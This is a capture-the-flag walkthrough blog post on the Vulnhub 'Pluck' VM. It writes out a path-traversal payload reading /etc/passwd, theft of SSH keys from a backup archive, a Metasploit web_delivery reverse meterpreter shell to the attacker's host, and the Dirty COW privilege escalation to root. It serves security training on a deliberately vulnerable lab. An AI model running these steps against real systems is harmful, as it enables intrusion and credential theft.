@@ -1,0 +1,404 @@
+
+								
+																		Hack the Pluck VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges, Kali Linux, Penetration Testing									
+									
+									
+									on April 4, 2017
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Coming towards another tutorial of vulnhub’s lab challenges “pluck” you can download it from here.
+This lab is quite simple this article may help you to solve the task for capturing the flag.
+Let,s Start
+192.168.1.115 is my target IP let enumerate through aggressive scan using NMAP. You can observe its result from the given screenshot.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.115
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.115
+					
+				
+			
+		
+
+
+Use Nikto to dig up more information related to the target
+
+		
+		
+			
+			
+			
+			
+nikto -h http://192.168.1.115
+			
+				
+					
+				
+					1
+				
+						nikto -h http://192.168.1.115
+					
+				
+			
+		
+
+ Finally, I have got something very remarkable here if you notice the given below image the highlighted text looks like local file inclusion vulnerability.
+
+So when I explore the above-highlighted text in the browser here I got more than enough data. The highlighted text denotes towards some kind of backup script file path.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.115/index.php?page=../../../../../../../../etc/passwd
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.115/index.php?page=../../../../../../../../etc/passwd
+					
+				
+			
+		
+
+
+When again I walk around it now further I found a tar file for backup.
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.115/index.php?page=/usr/local/scripts/backup.sh
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.115/index.php?page=/usr/local/scripts/backup.sh
+					
+				
+			
+		
+
+
+A download tar file of backup script, type following command inside the terminal of your Kali Linux.
+
+		
+		
+			
+			
+			
+			
+wget http://192.168.1.115/index.php?page=/backups/backup.tar
+			
+				
+					
+				
+					1
+				
+						wget http://192.168.1.115/index.php?page=/backups/backup.tar
+					
+				
+			
+		
+
+
+Now type the following command to extract the backup.tar file
+
+		
+		
+			
+			
+			
+			
+tar –xvf index.php\?page\=%2Fbackups%2Fbackup.tar
+			
+				
+					
+				
+					1
+				
+						tar –xvf index.php\?page\=%2Fbackups%2Fbackup.tar
+					
+				
+			
+		
+
+Inside it, I found the home folder which further contains a subfolder for 3 users.
+
+Among all 3 users only paul has keys
+
+		
+		
+			
+			
+			
+			
+cd paul
+ls
+cd keys
+ls
+			
+				
+					
+				
+					1234
+				
+						cd paullscd keysls
+					
+				
+			
+		
+
+So here I found 6 keys, let use one of them for connection.
+
+
+		
+		
+			
+			
+			
+			
+ssh -i id_key4 paul@192.168.1.115
+			
+				
+					
+				
+					1
+				
+						ssh -i id_key4 paul@192.168.1.115
+					
+				
+			
+		
+
+
+When you will try to connect with the target using ssh simultaneously a new terminal “Pdmenu” will pop up. Here I got so many options but I choose Edit file option that gave me a prompt to edit any file and it looks like command injection vulnerability.
+
+Now load Metasploit framework and type following
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)&gt;set target 1
+msf exploit (web_delivery)&gt;set payload php/meterpreter/reverse_tcp
+msf exploit (web_delivery)&gt;set lhost 192.168.1.15
+msf exploit (web_delivery)&gt;set lport 4444
+msf exploit (web_delivery)&gt;set srvport 8081
+msf exploit (web_delivery)&gt;exploit
+			
+				
+					
+				
+					1234567
+				
+						use exploit/multi/script/web_deliverymsf exploit (web_delivery)&gt;set target 1msf exploit (web_delivery)&gt;set payload php/meterpreter/reverse_tcpmsf exploit (web_delivery)&gt;set lhost 192.168.1.15msf exploit (web_delivery)&gt;set lport 4444msf exploit (web_delivery)&gt;set srvport 8081msf exploit (web_delivery)&gt;exploit
+					
+				
+			
+		
+
+Now copy the generated command php….5tz’));” and send it to target
+
+Now paste above command as shown in the screenshot and hit enter which will give you reverse connection at the background inside Metasploit.
+
+Great!!! We have got victim’s meterpreter session
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt;shell
+			
+				
+					
+				
+					1
+				
+						meterpreter&gt;shell
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+uname -a
+			
+				
+					
+				
+					1
+				
+						uname -a
+					
+				
+			
+		
+
+ Now use Dirty cow exploit
+Here got the path to download exploit which might be related to it.
+
+Open this path “http://www.exploit-db.com/download/40616” in the browser and downloads the exploit for dirty cow vulnerability. I have saved this exploit as raj.
+
+Now type the following command to compile your exploit so that it can run successfully inside your Kali Linux.
+
+		
+		
+			
+			
+			
+			
+gcc shell.c -o raj -pthread
+			
+				
+					
+				
+					1
+				
+						gcc shell.c -o raj -pthread
+					
+				
+			
+		
+
+
+Now we can run our exploit to achieve root permission and try to capture the flag
+
+		
+		
+			
+			
+			
+			
+./raj
+cd /root
+ls
+cat flag.txt
+			
+				
+					
+				
+					1234
+				
+						./rajcd /rootlscat flag.txt
+					
+				
+			
+		
+
+ Bravo!!! We have captured the flag.
+
+Author: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
